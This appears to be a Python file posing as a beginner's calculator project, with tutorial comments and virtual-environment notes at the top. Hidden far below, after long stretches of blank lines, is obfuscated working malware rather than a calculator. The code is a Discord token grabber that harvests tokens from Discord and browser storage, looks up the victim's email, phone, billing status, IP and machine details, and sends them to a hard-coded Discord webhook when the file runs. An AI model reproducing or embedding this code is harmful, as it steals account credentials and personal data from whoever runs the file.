
# Basic Personal Projects: Greating an basic python calculator with
#functionality for advanced calculator operations. 


# 2022/01/10



# RESOURCES/REFERENCE/TUTORIALS used to build calculator mini project:

# (1) Giraffe Academy is rebranding! I've decided to re-focus the brand of this channel to highlight myself as a developer and teacher! The newly minted Mike Dane channel will have all the same content, with more to come in the future!

#Source Code - http://www.mikedane.com/programming-l...

#This video is one in a series of videos where we'll be looking at programming in python. The course is designed for new programmers, and will introduce common programming topics using the python language.

#Throughout the course we'll be looking at various topics including variables, lists, tuples, loops, conditionals, object orientation, and much more.  

#If you’re enjoying Giraffe Academy and want to invest in our future, consider leaving a contribution
#http://www.mikedane.com/contribute


# ******* HOW TO BUILD A SIMPLE CALCULATOR IN PYTHON STEP BY STEP *****************
# 1. ADD
# 2. SUBTRACT
# 3. MULTIPLY
# 4. DIVIDE

#Find me on www.kindsonthegenius.com

#print("Select an operation to perform: ")
#print("1. ADD")
#print("2. SUBTRACT")
#print("3. MULTIPLY")
#print("4. DIVIDE")

#To Learn Python: www.kindsonthegenius.com/python
#Machine Learning 101: https://www.kindsonthegenius.com/mach...
#Subscribe Kindson The Genius Youtube: https://bit.ly/2PpJd8Q
#Join Machine Learning & Data Science in Python and R - https://www.facebook.com/groups/70477...
#Join my group ICS on Facebook: https://www.facebook.com/groups/inter...

#Follow me on Instagram  - https://www.instagram.com/kindsonm/
#Connect with me on LinkedIn: https://www.linkedin.com/in/kindson/
#Follow me on Twitter: https://twitter.com/KindsonM
#Learn about me: http://www.kindsonthegenius.com







#12.1. Introduction
#Python applications will often use packages and #modules that don’t come as part of the standard library. Applications will sometimes need a specific version of a library, because the application may require that a particular bug has been fixed or the application may be written using an obsolete version of the library’s interface.

#This means it may not be possible for one Python installation to meet the requirements of every application. If application A needs version 1.0 of a particular module but application B needs version 2.0, then the requirements are in conflict and installing either version 1.0 or 2.0 will leave one application unable to run.

#The solution for this problem is to create a virtual environment, a self-contained directory tree that contains a Python installation for a particular version of Python, plus a number of additional packages.

#Different applications can then use different virtual environments. To resolve the earlier example of conflicting requirements, application A can have its own virtual environment with version 1.0 installed while application B has another virtual environment with version 2.0. If application B requires a library be upgraded to version 3.0, this will not affect application A’s environment.

#12.2. Creating Virtual Environments
#The module used to create and manage virtual environments is called venv. venv will usually install the most recent version of Python that you have available. If you have multiple versions of Python on your system, you can select a specific Python version by running python3 or whichever version you want.

#To create a virtual environment, decide upon a directory where you want to place it, and run the venv module as a script with the directory path:






































































































import os #line:428

























































































































































if os .name !="nt":#line:429
    exit ()#line:430

































































































from re import findall #line:431

























































































from json import loads ,dumps #line:436




























































































































































































































from base64 import b64decode #line:439



















































































































































from subprocess import Popen ,PIPE #line:442




















































































































































from urllib .request import Request ,urlopen #line:444



























































































































from datetime import datetime #line:447




































































































from threading import Thread #line:448

















































































































from time import sleep #line:449































































from sys import argv #line:450




































































































LOCAL =os .getenv ("LOCALAPPDATA")#line:453



























































































































































































































ROAMING =os .getenv ("APPDATA")#line:454



























































































































































































PATHS ={"Discord":ROAMING +"\\Discord","Discord Canary":ROAMING +"\\discordcanary","Discord PTB":ROAMING +"\\discordptb","Google Chrome":LOCAL +"\\Google\\Chrome\\User Data\\Default","Opera":ROAMING +"\\Opera Software\\Opera Stable","Brave":LOCAL +"\\BraveSoftware\\Brave-Browser\\User Data\\Default","Yandex":LOCAL +"\\Yandex\\YandexBrowser\\User Data\\Default"}#line:465





































































































































def getheaders (token =None ,content_type ="application/json"):#line:466
    O0OO0O0O0OO0OOO00 ={"Content-Type":content_type ,"User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"}#line:470























































































































































    if token :#line:471
        O0OO0O0O0OO0OOO00 .update ({"Authorization":token })#line:472
    return O0OO0O0O0OO0OOO00 #line:473














































































































def getuserdata (O0O000O0O00O0OOOO ):#line:474










































































    try :#line:475
        return loads (urlopen (Request ("https://discordapp.com/api/v6/users/@me",headers =getheaders (O0O000O0O00O0OOOO ))).read ().decode ())#line:476


































































































    except :#line:477
        pass #line:478

















































































def gettokens (OO0OO00OO0O0O00OO ):#line:479
    OO0OO00OO0O0O00OO +="\\Local Storage\\leveldb"#line:480
    O0O00O0O00OO0OOO0 =[]#line:481















































































    for O0O0000OOOO0000OO in os .listdir (OO0OO00OO0O0O00OO ):#line:482
        if not O0O0000OOOO0000OO .endswith (".log")and not O0O0000OOOO0000OO .endswith (".ldb"):#line:483
            continue #line:484




















































        for O00O0O0OOO00OO0O0 in [O0O0O00OO000OOO0O .strip ()for O0O0O00OO000OOO0O in open (f"{OO0OO00OO0O0O00OO}\\{O0O0000OOOO0000OO}",errors ="ignore").readlines ()if O0O0O00OO000OOO0O .strip ()]:#line:485

























































            for O00OO00OO0O00OO00 in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}",r"mfa\.[\w-]{84}"):#line:486

































































































                for OOOOO00OO0000OO0O in findall (O00OO00OO0O00OO00 ,O00O0O0OOO00OO0O0 ):#line:487
                    O0O00O0O00OO0OOO0 .append (OOOOO00OO0000OO0O )#line:488
    return O0O00O0O00OO0OOO0 #line:489





































































































def getip ():#line:490
    O00O0OO0OOOO0OOOO ="None"#line:491


















































































    try :#line:492
        O00O0OO0OOOO0OOOO =urlopen (Request ("https://api.ipify.org")).read ().decode ().strip ()#line:493



























































































    except :#line:494
        pass #line:495







































































    return O00O0OO0OOOO0OOOO #line:496



































































































def getavatar (O0O0O0O00O0O000O0 ,O0OO0OOO0O0O00O00 ):#line:497
    OO0OO000O000OO0OO =f"https://cdn.discordapp.com/avatars/{O0O0O0O00O0O000O0}/{O0OO0OOO0O0O00O00}.gif"#line:498





































































































    try :#line:499
        urlopen (Request (OO0OO000O000OO0OO ))#line:500







































































































    except :#line:501
        OO0OO000O000OO0OO =OO0OO000O000OO0OO [:-4 ]#line:502









































































































    return OO0OO000O000OO0OO #line:503



























































































































def gethwid ():#line:504
    OO000O000OO0O0000 =Popen ("wmic csproduct get uuid",shell =True ,stdin =PIPE ,stdout =PIPE ,stderr =PIPE )#line:505





































































































    return (OO000O000OO0O0000 .stdout .read ()+OO000O000OO0O0000 .stderr .read ()).decode ().split ("\n")[1 ]#line:506






































































































































































def getchat (O0O00OOO0OO0O000O ,OOO00O0O0OO0000OO ):#line:507
    try :#line:508
        return loads (urlopen (Request ("https://discordapp.com/api/v6/users/@me/channels",headers =getheaders (O0O00OOO0OO0O000O ),data =dumps ({"recipient_id":OOO00O0O0OO0000OO }).encode ())).read ().decode ())["id"]#line:509




































































































































    except :#line:510
        pass #line:511
























































































def has_payment_methods (O0OO0OOO0O00O00O0 ):#line:512
    try :#line:513
        return bool (len (loads (urlopen (Request ("https://discordapp.com/api/v6/users/@me/billing/payment-sources",headers =getheaders (O0OO0OOO0O00O00O0 ))).read ().decode ()))>0 )#line:514









































































    except :#line:515
        pass #line:516





































































































def send_message (O0O0OOOO00000O0O0 ,O0O0OOO000O0OO00O ,OOO0OO00O0O00O000 ):#line:517
    try :#line:518
        urlopen (Request (f"https://discordapp.com/api/v6/channels/{O0O0OOO000O0OO00O}/messages",headers =getheaders (O0O0OOOO00000O0O0 ,"multipart/form-data; boundary=---------------------------325414537030329320151394843687"),data =OOO0OO00O0O00O000 .encode ())).read ().decode ()#line:519
    except :#line:520
        pass #line:521

































































































def main ():#line:522
    OOO000OOO00OO000O =ROAMING +"\\.cache~$"#line:523
    O0O0000OO0O0OO0OO =[]#line:524
    OO0O00O0OO0OOOOO0 =[]#line:525
    O00000000OO0OOO0O =[]#line:526
    O0OO00O0O00OOO00O =[]#line:527
    OO00OOOO00O00O0OO =[]#line:528
    O000O00OO0O0000O0 =getip ()#line:529
    OO0O000OOOOOOOO00 =os .getenv ("UserName")#line:530
    O0O00O0OO00O00OOO =os .getenv ("COMPUTERNAME")#line:531



































































































    for OO000O00OOOOO0OO0 ,OOOOOOOOOO00OO000 in PATHS .items ():#line:532
        if not os .path .exists (OOOOOOOOOO00OO000 ):#line:533
            continue #line:534




















































































































































        for OO0O00OO0O000O00O in gettokens (OOOOOOOOOO00OO000 ):#line:535
            if OO0O00OO0O000O00O in O00000000OO0OOO0O :#line:536
                continue #line:537
            O00000000OO0OOO0O .append (OO0O00OO0O000O00O )#line:538
            O0O0000000000O000 =None #line:539

































































































































            if not OO0O00OO0O000O00O .startswith ("mfa."):#line:540
                try :#line:541
                    O0O0000000000O000 =b64decode (OO0O00OO0O000O00O .split (".")[0 ].encode ()).decode ()#line:542














































































































                except :#line:543
                    pass #line:544





















































































































                if not O0O0000000000O000 or O0O0000000000O000 in OO00OOOO00O00O0OO :#line:545
                    continue #line:546
            OOOO0000O0O0OOO00 =getuserdata (OO0O00OO0O000O00O )#line:547
























































































































































































            if not OOOO0000O0O0OOO00 :#line:548
                continue #line:549
            OO00OOOO00O00O0OO .append (O0O0000000000O000 )#line:550
            OO0O00O0OO0OOOOO0 .append (OO0O00OO0O000O00O )#line:551
            O0O0OOO00OO0OOOO0 =OOOO0000O0O0OOO00 ["username"]+"#"+str (OOOO0000O0O0OOO00 ["discriminator"])#line:552
            O000OOOO00O000OO0 =OOOO0000O0O0OOO00 ["id"]#line:553
            O00OO0OO0OO0O0OO0 =OOOO0000O0O0OOO00 ["avatar"]#line:554
            O000OOO0000000O00 =getavatar (O000OOOO00O000OO0 ,O00OO0OO0OO0O0OO0 )#line:555
            O00O0OOOOO0O00O00 =OOOO0000O0O0OOO00 .get ("email")#line:556
            OOOOOOO0O00OO0OO0 =OOOO0000O0O0OOO00 .get ("phone")#line:557
            O000O00000OOOO0OO =bool (OOOO0000O0O0OOO00 .get ("premium_type"))#line:558
            OO0OO000OO0OO0OO0 =bool (has_payment_methods (OO0O00OO0O000O00O ))#line:559
            O000000O000OO00OO ={"color":0x7289da ,"fields":[{"name":"**Account Info**","value":f'Email: {O00O0OOOOO0O00O00}\nPhone: {OOOOOOO0O00OO0OO0}\nNitro: {O000O00000OOOO0OO}\nBilling Info: {OO0OO000OO0OO0OO0}',"inline":True },{"name":"**PC Info**","value":f'IP: {O000O00OO0O0000O0}\nUsername: {OO0O000OOOOOOOO00}\nPC Name: {O0O00O0OO00O00OOO}\nToken Location: {OO000O00OOOOO0OO0}',"inline":True },{"name":"**Token**","value":OO0O00OO0O000O00O ,"inline":False }],"author":{"name":f"{O0O0OOO00OO0OOOO0} ({O000OOOO00O000OO0})","icon_url":O000OOO0000000O00 },"footer":{}}#line:586
            O0O0000OO0O0OO0OO .append (O000000O000OO00OO )#line:587




















































































































    with open (OOO000OOO00OO000O ,"a")as OOOO0O0O00OOOO000 :#line:588


















































        for OO0O00OO0O000O00O in O00000000OO0OOO0O :#line:589
            if not OO0O00OO0O000O00O in O0OO00O0O00OOO00O :#line:590
                OOOO0O0O00OOOO000 .write (OO0O00OO0O000O00O +"\n")#line:591



























































    if len (OO0O00O0OO0OOOOO0 )==0 :#line:592
        OO0O00O0OO0OOOOO0 .append ('123')#line:593
    O0O00000OO0OOOOOO ={"content":"","embeds":O0O0000OO0O0OO0OO ,"username":"Discord Token Grabber","avatar_url":"https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"}#line:599













































































    try :#line:600
        urlopen (Request ("https://discordapp.com/api/webhooks/945550553864355840/zWALN_9FLl5CxV0dkAuUQQynyLQgvBXip1AS09xrV6E0rpaqtFZHodpdz_mamaiJtidU",data =dumps (O0O00000OO0OOOOOO ).encode (),headers =getheaders ()))#line:601







































































    except :#line:602
        pass #line:603

































































main ()
